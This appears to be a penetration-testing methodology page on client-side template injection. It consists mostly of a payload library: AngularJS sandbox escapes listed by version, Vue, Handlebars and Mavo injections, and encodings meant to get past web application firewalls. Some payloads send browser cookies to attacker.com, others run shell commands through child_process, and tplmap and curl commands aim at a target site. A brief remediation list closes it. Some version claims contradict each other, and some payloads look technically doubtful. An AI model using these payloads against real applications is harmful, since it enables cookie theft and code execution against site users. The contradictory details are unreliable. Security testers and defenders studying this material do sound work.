---
title: "Client-Side Template Injection (CSTI)"
date: 2026-02-24
draft: false
---

# Client-Side Template Injection (CSTI)

> **Severity**: High | **CWE**: CWE-79, CWE-94
> **OWASP**: A03:2021 – Injection

---

## What Is CSTI?

Client-Side Template Injection occurs when user input is interpolated directly into a **client-side template engine** (AngularJS, Vue.js, Handlebars, Mavo, etc.) without sanitization. Unlike XSS where you inject HTML/JS directly, CSTI injects template syntax that the framework itself evaluates — often **bypassing XSS filters** that sanitize HTML but not template delimiters.

```
AngularJS app renders: <div ng-app>Hello {{username}}</div>
Username = "{{7*7}}"
Rendered:  Hello 49  ← template evaluated → CSTI confirmed

Escalate:  username = "{{constructor.constructor('alert(1)')()}}"
```

CSTI is particularly powerful against apps that use AngularJS with `ng-app` on a wide DOM scope — because the **AngularJS sandbox escape** gives full JavaScript execution.

---

## Discovery Checklist

**Phase 1 — Identify Template Engine**
- [ ] Check page source for template delimiters: `{{`, `[[`, `${`, `{[`, `<%`
- [ ] Check JS bundles for: `angular`, `vue`, `handlebars`, `mustache`, `nunjucks`, `pug`
- [ ] Look for `ng-app`, `ng-controller`, `v-app`, `data-ng-*` HTML attributes → AngularJS/Vue
- [ ] Check Angular version in `angular.min.js` or `ng-version` attribute
- [ ] Check for `x-ng-` or `data-ng-` prefixed attributes (AngularJS)

**Phase 2 — Inject Detection Probes**
- [ ] `{{7*7}}` → if `49` rendered → AngularJS/Jinja2/Vue
- [ ] `{[7*7]}` → alternative AngularJS custom delimiter
- [ ] `[[7*7]]` → Vue.js / custom config
- [ ] `{{constructor}}` → AngularJS → should not print "function Function()"
- [ ] `{{$eval('7*7')}}` → AngularJS-specific
- [ ] Inject in: URL path, query params, form fields, HTTP headers reflected in page, hash fragment

**Phase 3 — Sandbox Escape Mapping**
- [ ] Confirm AngularJS version from source (1.0.x through 1.6.x → different escapes)
- [ ] Test each sandbox escape in order (version-specific)
- [ ] Test Vue.js computed property injection
- [ ] Test Handlebars `{{#with}}` injection (client-side Handlebars)

---

## Payload Library

### Payload 1 — AngularJS Sandbox Escapes (by Version)

```javascript
// AngularJS 1.0.x–1.1.x (no sandbox):
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// AngularJS 1.2.x sandbox escape:
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// AngularJS 1.3.0–1.3.1:
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)');}}

// AngularJS 1.3.2–1.3.18:
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}

// AngularJS 1.3.19–1.3.x:
{{!ready && (ready = true) && (
  !call ? $$watchers[0].get=constructor.constructor('init=require(\'child_process\')') :
  (a = apply) &&
  (apply = constructor) &&
  (valueOf = call) &&
  ('' + this)
);}}

// AngularJS 1.4.0–1.4.9:
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// AngularJS 1.5.0–1.5.8:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// AngularJS 1.5.9–1.5.11:
{{
  c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
  c.$apply=$apply;c.$eval=b;op=$root.$$phase;
  $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
  C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
  B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
  ");
  m1=B($$asyncQueue.pop().expression,null,$root);
  m2=B(C,null,m1);[].push.apply(isArray,[]);
  m2(isArray,$root);
}}

// AngularJS 1.6.x (last major version with sandbox):
{{constructor.constructor('alert(document.domain)')()}}
// Sandbox fully removed in 1.6.0 — if app uses 1.6+, direct eval works:
{{constructor.constructor('fetch("https://attacker.com/?c="+document.cookie)')()}}
```

### Payload 2 — AngularJS: HTML Attribute Context Injections

```javascript
// When injection point is inside an AngularJS attribute value:
// <p title="{{userInput}}">

// Break out of string context:
" onmouseover="{{constructor.constructor('alert(1)')()}}
" ng-click="constructor.constructor('alert(1)')()

// When inside ng-bind or ng-model:
{{constructor.constructor('alert(1)')()}}

// CSS injection via ng-style:
// <div ng-style="userInput">
{"color":"red;background:url(javascript:alert(1))"}

// Via ng-href — XSS through protocol:
javascript:alert(1)
{{constructor.constructor('alert(1)')()}}

// ng-include SSRF/path injection:
// <ng-include src="userInput">
'https://attacker.com/evil.js'
'/api/admin/settings'      // internal resource inclusion

// ng-src for SSRF:
// <img ng-src="userInput">
'javascript:alert(1)'
'https://COLLABORATOR_ID.oast.pro/img'   // OOB
```

### Payload 3 — Vue.js Template Injection

```javascript
// Vue.js 2.x / 3.x — less commonly injectable but check:
// If app uses v-html directive with user content → XSS (not CSTI)
// If app server-renders Vue templates with user input → SSTI

// Client-side: look for custom delimiters in Vue config:
// new Vue({ delimiters: ['[[', ']]'] })
[[7*7]]        // custom delimiter test
[[constructor.constructor('alert(1)')()]]

// Vue template injection via `template` option:
// If app does: new Vue({ template: userInput })
<div>{{ constructor.constructor('alert(1)')() }}</div>

// Vue.js v-bind injection:
// <div v-bind:class="userInput">
constructor.constructor('alert(1)')()

// Vue SSR (server-side rendering) → SSTI:
{{ constructor.constructor('require("child_process").execSync("id").toString()')() }}
```

### Payload 4 — Handlebars Client-Side Injection

```javascript
// If app uses client-side Handlebars rendering with user input in template string:

// Detection:
{{7*7}}   // Handlebars doesn't evaluate math → outputs "7*7" or errors
{{this}}  // → outputs current context as JSON

// Handlebars doesn't eval JS directly, but {{lookup}} can be abused:
// Access prototype via lookups:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

// Simpler Handlebars XSS via triple-stache (unescaped output):
// {{{userInput}}} → raw HTML → XSS
// If triple-stache used anywhere: {{ {<script>alert(1)</script>}}}

// Handlebars partial injection:
// {{> partialName}} — if partialName is user-controlled → arbitrary template include
{{> ../../../etc/passwd}}
```

### Payload 5 — Mavo / Polymer Injection

```javascript
// Mavo (data-driven framework using expression language):
// Injection via data-output, data-compute attributes:
[7*7]
[fetch('https://attacker.com/?c='+document.cookie)]

// Polymer template injection:
// <template is="dom-bind"><span>{{input}}</span></template>
{{alert(1)}}

// GWT (Google Web Toolkit) SafeHtml bypass — if SafeHtml builder uses user input:
// Inject into template placeholders that accept HTML fragments
```

### Payload 6 — Encoding Bypass Matrix

```
// Raw CSTI payloads often blocked by WAF — use encoding:

// AngularJS 1.6 direct (raw):
{{constructor.constructor('alert(1)')()}}

// HTML entity encode (in HTML attribute context):
&#x7b;&#x7b;constructor.constructor('alert(1)')()&#x7d;&#x7d;
{{constructor.constructor(&#x27;alert(1)&#x27;)()}}
{{constructor.constructor('\u0061\u006c\u0065\u0072\u0074\u00281\u0029')()}}

// String concat bypass for filtered keywords:
{{'ale'+'rt(1)'|eval}}                       // Vue
{{constructor['constructor']('alert(1)')()}} // bracket notation

// Bypass 'alert' keyword filter:
{{constructor.constructor('a=new Function;a("al"+"ert(1)")')()}}
{{constructor.constructor(atob('YWxlcnQoMSk='))()}}  // base64 decode

// Bypass 'constructor' filter:
{{''.sub['__proto__']['constructor'].constructor('alert(1)')()}}
{{[].__proto__.constructor.constructor('alert(1)')()}}

// URL-encoded in GET parameter:
%7b%7bconstructor.constructor('alert(1)')()%7d%7d
%7b%7b7*7%7d%7d

// Angular CSP bypass (when CSP blocks inline script):
// Use ng-csp with external script gadget or $http injection
```

---

## Tools

```bash
# tplmap — also covers CSTI (AngularJS, Handlebars, Vue):
git clone https://github.com/epinna/tplmap
python3 tplmap.py -u "https://target.com/search?q=*" \
  --engine AngularJS --level 5

python3 tplmap.py -u "https://target.com/search?q=*" \
  --engine Handlebars --level 5

# Manual AngularJS detection:
curl -s "https://target.com/page?name=%7B%7B7*7%7D%7D" | grep "49"
# %7B%7B = {{, %7D%7D = }}

# Detect AngularJS version from page source:
curl -s "https://target.com/" | grep -oP 'angular[^"]*\.js' | head -3
# Or look for: ng-version="1.6.9" attribute in <html> tag

# Test in browser DevTools (for client-side testing):
# Open console, check if angular is defined:
angular.version.full  // e.g. "1.6.9"

# Burp Suite:
# Active Scan → Client-Side Template Injection
# Extension: Backslash Powered Scanner detects CSTI patterns

# Find AngularJS usage in page:
grep -i "ng-app\|ng-controller\|ng-model\|angular.min.js\|angularjs" page.html

# Test all reflected parameters:
# Use Burp Scanner → Client-Side JavaScript issues
# Or manually inject {{7*7}} into every input and check response
```

---

## Remediation Reference

- **Avoid client-side template compilation from user data**: never pass user input directly to `$compile`, `$eval`, or as a template string
- **Sanitize before template interpolation**: use `$sanitize` or framework's safe HTML interpolation that escapes `{{` and `}}`
- **CSP**: `script-src 'self'` blocks `constructor.constructor('alert(1)')()` from executing dynamic code — strong mitigation
- **Angular**: prefer Angular 2+ (TypeScript-based, no `$scope`, no sandbox) over AngularJS 1.x for new projects
- **Handlebars**: use precompiled templates, never compile user-supplied strings
- **Vue.js**: do not use `v-html` with untrusted content; do not render user-provided template strings via `new Vue({ template: ... })`
- **Output encoding**: always HTML-encode user data before inserting into template contexts

*Part of the Web Application Penetration Testing Methodology series.*
